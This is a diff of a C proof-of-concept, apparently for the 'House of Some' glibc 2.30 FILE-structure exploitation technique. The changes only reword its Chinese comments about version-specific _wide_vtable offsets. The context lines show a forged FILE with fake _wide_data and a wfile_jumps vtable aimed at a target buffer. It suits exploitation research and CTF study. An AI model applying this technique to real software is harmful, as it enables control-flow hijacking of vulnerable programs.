@@ -9,11 +9,12 @@
 #include <unistd.h>
 
 /*
- * House of Some 消费端：glibc 2.30 / x86-64。
+ * House of Some 消费链验证：glibc 2.30 / x86-64。
  *
- * 2.30 的 09e1b0e 删除 legacy codecvt 函数表，使 `_wide_vtable` 从
- * +0x130 缩到 +0xf0；2.31 的 70c6e15 又把它缩到 +0xe0。因此这个版本
- * 必须有独立 payload，不能照搬相邻版本。
+ * 2.30 的提交 09e1b0e 删掉了 legacy codecvt 函数表，导致 `_wide_vtable`
+ * 的偏移从 +0x130 收缩到 +0xf0；紧接着 2.31 的 70c6e15 又把它进一步
+ * 收缩到 +0xe0。这两个版本前后夹着一个只用一版的过渡布局，所以 2.30
+ * 必须单独写一份 payload，不能直接照搬相邻版本的偏移。
  */
 
 #define IO_LINKED 0x0080
@@ -59,7 +60,7 @@ int main(void)
     fake.file._fileno = fds[0];
     fake.file._lock = lock_storage;
     fake.file._mode = 2;
-    /* 把 FILE 的 _wide_data 字段指向伪造宽字符对象。 */
+    /* 把 FILE 的 _wide_data 字段指向我们伪造的宽字符对象。 */
     *(void **)((unsigned char *)&fake.file + 0xa0) = wide;
 
     fake.file._IO_read_base = (char *)target;
@@ -72,7 +73,7 @@ int main(void)
     fake.file._IO_buf_end = (char *)target + sizeof(target);
     fake.vtable = wfile_jumps;
 
-    /* 调用链与其他版本相同，唯一 ABI 差异是最后一行的 +0xf0。 */
+    /* 整条调用链和其他版本一样，唯一的 ABI 差异就是最后一行的 +0xf0。 */
     *(void **)(wide + 0x18) = NULL;                    /* 设置 wide->_IO_write_base。 */
     *(void **)(wide + 0x20) = (void *)1;               /* 设置 wide->_IO_write_ptr。 */
     *(void **)(wide + 0x30) = NULL;                    /* 设置 wide->_IO_buf_base。 */
